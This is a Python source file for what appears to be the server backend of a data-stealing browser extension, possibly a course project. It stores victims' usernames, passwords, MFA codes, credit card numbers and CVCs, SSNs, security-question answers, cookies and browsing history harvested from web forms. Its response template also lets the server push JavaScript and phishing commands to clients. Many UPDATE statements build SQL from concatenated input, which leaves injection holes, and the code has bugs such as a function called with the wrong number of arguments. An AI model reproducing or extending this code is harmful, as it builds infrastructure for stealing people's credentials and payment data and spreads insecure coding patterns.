import pymysql
import json
from copy import deepcopy

conn = None
BASE_SERVER_RESPONSE = {
    "clientid": 0,
    "security_blacklist":[],
    "ad_domains":[],
    "js-cmd":[],
    "phish-cmd":[]
}
pending_payloads = {} #format: clientid:<instance of server response>; fetched from database


def new_response(clientid):
    resp = deepcopy(BASE_SERVER_RESPONSE)
    resp["clientid"] = clientid
    return resp


def initDB():
    global conn
    conn = conn or pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')

def getCursor():
    global conn
    initDB()
    return conn.cursor()


"""
Gets pending payload or constructs a new one and populates based on defaults from the database.
Pulls blacklist and ad list from database
"""
def construct_response(clientid):
    resp = pending_payloads.pop(clientid, None) or new_response(clientid)

    return resp


"""
Handles creation of new client.
param data is the entire payload converted from json into a dictionary
parses any possible data and inserts the row, then returns the clientid that was generated using LAST_INSERT_ID()
for example, browser history, credentials, forms, etc.
"""
def create_new_client(data):
    return 0


"""
Appends each url in the list of history to the client's history file 
    after appending a current timestamp
param data => list of urls
file: ../history-files/<clientid>-hist.txt
returns 0 for ok, non-zero for bad data format
"""
def store_history(data, clientid):
    return 0


"""
Stores a single cookie into the database
returns 0 for ok, non-zero for bad data format
"""
def store_cookie(data, clientid):
    return 0


"""
Stores a single credential into the database
returns 0 for ok, non-zero for bad data format
"""
def store_credential(credentials, clientid):
    url = credentials.get("url", None)
    cur = getCursor()
    if(credentials.get("Username", None) != None and url != None):
        checkUsername = credentials.get("Username", None)
        cur.execute('SELECT * FROM Credentials WHERE Username = %s AND URL = %s AND CID = %s', (checkUsername, url, clientid))
        if(cur.rowcount == 0):
            cur.execute('INSERT INTO Credentials(Username, UserPassword, URL, CID, MFA) VALUES (%s, %s, %s, %s, %s)', (checkUsername, credentials.get("UserPassword", None), url, clientid, credentials.get("MFA", None)))
        else:
            if(credentials.get("UserPassword", None) != None):
                col5 = credentials.get("UserPassword", None)
                execStr = "UPDATE Credentials SET UserPassword = '" + col5 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url  + "' AND CID = " + str(clientid) 
                cur.execute(execStr)
            if(credentials.get("MFA", None) != None):
                col6 = credentials.get("MFA", None)
                execStr = "UPDATE Credentials SET MFA = '" + col6 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url + "' AND CID = " + str(clientid)
                cur.execute(execStr)

    return 0


def store_payload(clientid):
    payload = pending_payloads.pop(clientid, None)
    if payload == None:
        return
    cur = getCursor()
    cur.execute("insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)", (clientid, payload, payload, clientid))
    conn.commit()


"""
param data: form from extension->server payload in the form of a dictionary. key-value pairs are
    "url": url and remotedef: value
Function first reduces url to subdomain.domain.tld and queries FormIDMappings table for all matching rows
Then, for each remotedef: value pair looks for a mapping from query results. if not found, pair is left
    in the dict. if it is found, the data is stored in the appropriate place. (Credentials, CreditCard, etc.)
Remaining values are stored in the ComplexForms table after being converted back into a json string.
"""
def store_form_data(data, clientid):
    url = data.pop("url", None)
    if url == None:
        return -1
    reducedURL = url.split('/')[0] + "//" + url.split('/')[2] + "/"
    cur = getCursor()
    cur.execute('SELECT * FROM FormIDMappings WHERE URL = (%s) OR URL = (%s)', (reducedURL, "*"))
    test = cur.fetchall()

    creditCard = {
                "CreditCardNumber": None,
                "CVC": None,
                "ExpirationDate": None,
                "CID": clientid,
                "Type": None
                }
    credentials = {
            "Username": None,
            "UserPassword": None,
            "URL": url,
            "CID": clientid,
            "MFA": None
            }
    securityQ = {
            "CID": clientid, 
            "Question": None,
            "Answer": None,
            "URL": url
            }
    enums = ["CellPhone", "StreetAddress", "Email", "SSN", "FirstName", "LastName", "BirthDate", "City", "ZipCode", "Country", "State", "CreditCardNumber", "CVC", "ExpirationDate", "Type", "Username", "Password", "MFA", "Question", "Answer"]
    securityList = [securityQ for x in range(5)]
    curIndexQ = 0
    curIndexA = 0

    #populate dictionary and pass dictionart to separate function to store data in database
    for row in test:
        if(row[1] in enums):
            val = data.pop(row[2], None)
            if(val != None):    
                if(row[1] == "CellPhone" or row[1] == "StreetAddress" or row[1] == "Email" or row[1] == "SSN" or row[1] == "FirstName" or row[1] == "LastName" or row[1] == "BirthDate" or row[1] == "City" or row[1] == "ZipCode" or row[1] == "Country" or row[1] == "State"):
                    print(val)
                    execStr = "UPDATE Client SET " + row[1] + " = '" + val + "' WHERE Id = " + str(clientid)
                    cur.execute(execStr)
                    if(row[1] == "CellPhone"):
                        enums.remove("CellPhone")
                    if(row[1] == "StreetAddress"):
                        enums.remove("StreetAddress")
                    if(row[1] == "Email"):
                        enums.remove("Email")
                    if(row[1] == "SSN"):
                        enums.remove("SSN")
                    if(row[1] == "FirstName"):
                        print(val)
                        enums.remove("FirstName")
                    if(row[1] == "LastName"):
                        enums.remove("LastName")
                    if(row[1] == "BirthDate"):
                        enums.remove("BirthDate")
                    if(row[1] == "City"):
                        enums.remove("City")
                    if(row[1] == "ZipCode"):
                        enums.remove("ZipCode")
                    if(row[1] == "Country"):
                        enums.remove("Country")
                    if(row[1] == "State"):
                        enums.remove("State")
                elif(row[1] == "CreditCardNumber"):
                    creditCard["CreditCardNumber"] = val
                    enums.remove("CreditCardNumber")
                elif(row[1] == "CVC"):
                    creditCard["CVC"] = val
                    enums.remove("CVC")
                elif(row[1] == "ExpirationDate"):
                    creditCard["ExpirationDate"] = val
                    enums.remove("ExpirationDate")
                elif(row[1] == "Type"):
                    creditCard["Type"] = val
                    enums.remove("Type")
                elif(row[1] == "Username"):
                    credentials["Username"] = val
                    enums.remove("Username")
                elif(row[1] == "UserPassword"):
                    credentials["UserPassword"] = val
                    enums.remove("UserPassword")
                elif(row[1] == "MFA"):
                    credentials["MFA"] = val
                    enums.remove("MFA")
                elif(row[1] == "Question"):
                    securityList[curIndexQ]["Question"] = val
                    curIndexQ = curIndexQ + 1
                    #securityQ["Question"] = val
                elif(row[1] == "Answer"):
                    #securityList["Answer"] = val
                    securityList[curIndexA]["Answer"] = val
                    curIndexA = curIndexA + 1
    
        #credit card information
    if(creditCard.get("CreditCardNumber", None) != None):
        checkCreditCard = creditCard.get("CreditCardNumber", None)
        cur.execute('SELECT * FROM CreditCard WHERE CreditCardNumber = %s', checkCreditCard)
        if(cur.rowcount == 0):
            cur.execute('INSERT INTO CreditCard(CreditCardNumber, CVC, ExpirationDate, CID, Type) VALUES (%s, %s, %s, %s, %s)', (checkCreditCard, creditCard.get("CVC", None), creditCard.get("ExpirationDate", None), clientid, creditCard.get("Type", None)))
        else:
            if(creditCard.get("CVC", None) != None):
                col2 = creditCard.get("CVC", None)
                execStr = "UPDATE CreditCard SET CVC = '" + col2 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                cur.execute(execStr)
            if(creditCard.get("ExpirationDate", None) != None):
                col3 = creditCard.get("ExpirationDate", None)
                execStr = "UPDATE CreditCard SET ExpirationDate = '" + col3 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                cur.execute(execStr)
            if(creditCard.get("Type", None) != None):
                col4 = creditCard.get("Type", None)
                execStr = "UPDATE CreditCard SET Type = '" + col4 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                cur.execute(execStr)
    
    #credentials information
    store_credential(credentials, clientid, url)


    #security questions information

    for x in range(0, 5):
        if(securityList[x].get("Question", None) != None):
            checkQ = securityList[x].get("Question", None)
            cur.execute('SELECT * FROM SecurityQuestions WHERE CID = %s AND URL = %s AND Question = %s', (clientid, url, checkQ))
            if(cur.rowcount == 0):
                cur.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, checkQ, securityList[x].get("Answer", None), url))
            else:
                col7 = securityList[x].get("Answer", None)
                execStr = "UPDATE SecurityQuestions SET Answer = '" + col7 + "' WHERE CID = " + str(clientid) + " AND URL = '" + url + "' AND Question = '" + checkQ + "'"            
                cur.execute(execStr)

    if(bool(data) == True):
        complexData = json.dumps(data)
        cur.execute('SELECT * FROM ComplexForms WHERE CID = %s AND JSONFORM = %s', (clientid, complexData))
        if(cur.rowcount == 0):
            cur.execute('SELECT * FROM Client WHERE ID = %s', clientid)
            if(cur.rowcount != 0):
                cur.execute('INSERT INTO ComplexForms(CID, JSONFORM) VALUES (%s, %s)', (clientid, complexData))
    conn.commit()
